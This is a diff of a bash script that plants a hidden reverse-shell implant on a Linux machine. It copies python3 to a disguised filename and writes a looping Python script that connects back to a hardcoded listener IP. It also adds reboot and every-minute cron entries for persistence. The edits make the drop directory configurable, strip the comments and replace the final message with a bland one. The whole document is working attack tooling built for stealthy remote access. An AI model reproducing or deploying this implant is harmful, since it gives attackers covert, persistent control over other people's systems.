@@ -1,16 +1,19 @@
 #!/bin/bash
 
-echo "[+] Enter your listener port number (e.g., 9873):"
+echo "[+] Enter your listener port number (e.g., ):"
 read PORT
+
+echo "[+] Enter the directory should be stored (e.g.,):"
+read TARGET_DIR
 
 LISTENER_IP="78.153.136.231"  # <-- You can also read this via user input
 
 # Copy Python to stealthy name
-cp /usr/bin/python3 /dev/shm/.dbus-launch
+cp /usr/bin/python3 "$TARGET_DIR/.dbus-launch"
 
 # Create the reverse shell script
-cat << EOF > /dev/shm/.cored
-#!/dev/shm/.dbus-launch
+cat << EOF > "$TARGET_DIR/.cored"
+#!$TARGET_DIR/.dbus-launch
 import socket, subprocess, os, time
 while True:
   try:
@@ -24,20 +27,20 @@ while True:
     time.sleep(60)
 EOF
 
-# Make it executable
-chmod +x /dev/shm/.cored
 
-# Save current crontab if it exists, or make a new one
+chmod +x "$TARGET_DIR/.cored"
+
+
 crontab -l 2>/dev/null > /tmp/.fonts || true
 
-# Add persistence
-echo "@reboot setsid nohup /dev/shm/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
-echo "* * * * * setsid nohup /dev/shm/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
 
-# Apply crontab
+echo "@reboot setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
+echo "* * * * * setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
+
+
 crontab /tmp/.fonts
 
-# Clean up
+
 rm /tmp/.fonts
 
-echo "[+] Reverse shell script installed and persistence added."
+echo "[+] Done."
